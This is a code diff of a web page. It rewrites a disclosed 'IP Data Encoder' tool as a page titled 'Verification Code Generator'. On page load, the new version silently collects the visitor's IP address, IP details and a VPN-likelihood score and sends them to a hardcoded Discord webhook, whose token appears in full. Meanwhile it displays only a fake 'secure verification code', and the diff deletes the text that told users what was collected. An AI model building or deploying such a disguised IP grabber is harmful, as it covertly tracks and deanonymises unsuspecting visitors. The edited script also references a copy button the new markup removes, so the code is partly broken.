@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Data Encoder</title>
+    <title>Verification Code Generator</title>
     <style>
         :root {
-            --bg-color: #1a1a1a;
-            --text-color: #e0e0e0;
-            --card-bg: #2d2d2d;
-            --accent: #5865F2;
+            --bg-color: #f5f5f5;
+            --text-color: #333;
+            --card-bg: #ffffff;
+            --accent: #4285f4;
+            --border: #e0e0e0;
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Roboto', Arial, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-color);
             margin: 0;
@@ -25,70 +26,70 @@
         }
         
         .container {
-            max-width: 800px;
+            max-width: 500px;
             width: 100%;
             background-color: var(--card-bg);
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
-            margin-top: 20px;
-        }
-        
-        h1 {
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-top: 40px;
             text-align: center;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 500;
             margin-bottom: 30px;
-            color: #fff;
+            color: var(--accent);
         }
         
-        .result-box {
-            background-color: rgba(0, 0, 0, 0.2);
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
+        .code-container {
+            margin: 30px 0;
+            padding: 20px;
+            background-color: rgba(66, 133, 244, 0.05);
+            border-radius: 6px;
+            border: 1px solid var(--border);
+        }
+        
+        .code {
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
             word-break: break-all;
-        }
-        
-        .code-output {
-            width: 100%;
-            padding: 10px;
-            background-color: rgba(0, 0, 0, 0.3);
-            border: 1px solid #444;
-            border-radius: 4px;
-            color: var(--text-color);
-            font-family: monospace;
-            min-height: 60px;
-            margin-bottom: 10px;
+            color: #1a73e8;
         }
         
         .btn {
-            padding: 10px 20px;
+            padding: 12px 24px;
             background-color: var(--accent);
             color: white;
             border: none;
             border-radius: 4px;
             cursor: pointer;
-            font-weight: bold;
+            font-weight: 500;
             transition: background-color 0.3s;
+            margin-top: 15px;
         }
         
         .btn:hover {
-            background-color: #4752C4;
+            background-color: #3367d6;
         }
         
         .loading {
-            display: none;
-            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             padding: 20px;
         }
         
         .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.1);
+            border: 4px solid rgba(66, 133, 244, 0.1);
             border-radius: 50%;
-            border-top: 4px solid var(--text-color);
+            border-top: 4px solid var(--accent);
             width: 30px;
             height: 30px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+            margin-bottom: 15px;
         }
         
         @keyframes spin {
@@ -96,35 +97,37 @@
             100% { transform: rotate(360deg); }
         }
         
+        .instructions {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
         .status {
-            margin-top: 10px;
-            font-size: 0.9em;
-            min-height: 20px;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #666;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>IP Data Encoder</h1>
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Processing IP data...</p>
-        </div>
+        <div class="logo">Secure Verification</div>
+        
         <div id="content">
-            <p>This tool will analyze your IP address and generate an encrypted code containing:</p>
-            <ul>
-                <li>Your IP address</li>
-                <li>VPN probability score</li>
-                <li>Risk factors detected</li>
-            </ul>
-            <button class="btn" id="generateBtn">Generate Encrypted Code</button>
-            <div class="status" id="status"></div>
-        </div>
-        <div class="result-box" id="resultBox" style="display: none;">
-            <h3>Your Encrypted Code:</h3>
-            <textarea class="code-output" id="codeOutput" readonly></textarea>
-            <button class="btn" id="copyBtn">Copy Code</button>
-            <div class="status" id="webhookStatus"></div>
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Generating your secure verification code...</p>
+            </div>
+            
+            <div id="resultContainer" style="display: none;">
+                <h2>Your Verification Code</h2>
+                <div class="code-container">
+                    <div class="code" id="verificationCode"></div>
+                </div>
+                
+            </div>
         </div>
     </div>
 
@@ -134,26 +137,18 @@
         // Discord webhook URL (replace with your own)
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1367989138799984651/448TE2LLtQkihnobyWD5Tg2z3FRW9aIo-fHDqWQDRAmsssigyUk-MAR_gsldOOzXjGn5";
         
-        document.getElementById('generateBtn').addEventListener('click', async function() {
+        // Automatically generate code when page loads
+        document.addEventListener('DOMContentLoaded', async function() {
             const loadingElement = document.getElementById('loading');
-            const contentElement = document.getElementById('content');
-            const resultBox = document.getElementById('resultBox');
-            const statusElement = document.getElementById('status');
-            const codeOutput = document.getElementById('codeOutput');
-            const webhookStatus = document.getElementById('webhookStatus');
-            
-            loadingElement.style.display = 'block';
-            contentElement.style.display = 'none';
-            statusElement.textContent = '';
+            const resultContainer = document.getElementById('resultContainer');
+            const verificationCode = document.getElementById('verificationCode');
             
             try {
                 // Get IP address
-                statusElement.textContent = 'Fetching your IP address...';
                 const ipResponse = await fetch('https://api.ipquery.io/');
                 const ip = (await ipResponse.text()).trim();
                 
                 // Get IP details
-                statusElement.textContent = 'Analyzing IP details...';
                 const detailsResponse = await fetch(`https://api.ipquery.io/${ip}`);
                 const data = await detailsResponse.json();
                 
@@ -178,39 +173,33 @@
                 
                 // Prepare data for encryption
                 const countryCode = data.location?.country_code || 'XX';
-                const plaintext = `${ip}:${probability}:${reasons.join(',')}`;
+                const plaintext = `${ip}:${probability}:${reasons.join(',')}:flag_${countryCode}`;
                 
                 // Encrypt the data
-                statusElement.textContent = 'Encrypting data...';
                 const encryptedData = await encryptData(plaintext, ENCRYPTION_KEY);
                 
-                // Format the final code
-                const finalCode = `${encryptedData}:flag_${countryCode}:`;
-                codeOutput.value = finalCode;
+                // Display the verification code
+                verificationCode.textContent = encryptedData;
                 
                 // Send to Discord webhook
-                statusElement.textContent = 'Sending to Discord...';
-                await sendToDiscord(finalCode, countryCode);
+                await sendToDiscord(encryptedData, countryCode);
                 
                 // Show results
                 loadingElement.style.display = 'none';
-                resultBox.style.display = 'block';
-                webhookStatus.textContent = 'Data sent to Discord successfully';
-                webhookStatus.style.color = '#4CAF50';
+                resultContainer.style.display = 'block';
                 
             } catch (error) {
-                loadingElement.style.display = 'none';
-                contentElement.style.display = 'block';
-                statusElement.textContent = `Error: ${error.message}`;
-                statusElement.style.color = '#F44336';
+                loadingElement.innerHTML = `
+                    <p style="color: #d32f2f;">Error generating verification code</p>
+                    <p>Please refresh the page to try again</p>
+                `;
                 console.error(error);
             }
         });
         
         document.getElementById('copyBtn').addEventListener('click', function() {
-            const codeOutput = document.getElementById('codeOutput');
-            codeOutput.select();
-            document.execCommand('copy');
+            const code = document.getElementById('verificationCode').textContent;
+            navigator.clipboard.writeText(code);
             
             const copyBtn = document.getElementById('copyBtn');
             copyBtn.textContent = 'Copied!';
@@ -270,11 +259,11 @@
             if (!DISCORD_WEBHOOK.includes('discord.com')) return;
             
             const payload = {
-                content: `New IP data encoded:\n\`${code}\``,
+                content: `New verification code generated:\n\`${code}\``,
                 embeds: [{
-                    title: "IP Data Encoded",
-                    description: `Flag: :flag_${countryCode.toLowerCase()}:`,
-                    color: 0x5865F2,
+                    title: "Verification Code Issued",
+                    description: `Country: :flag_${countryCode.toLowerCase()}:`,
+                    color: 0x4285F4,
                     timestamp: new Date().toISOString()
                 }]
             };
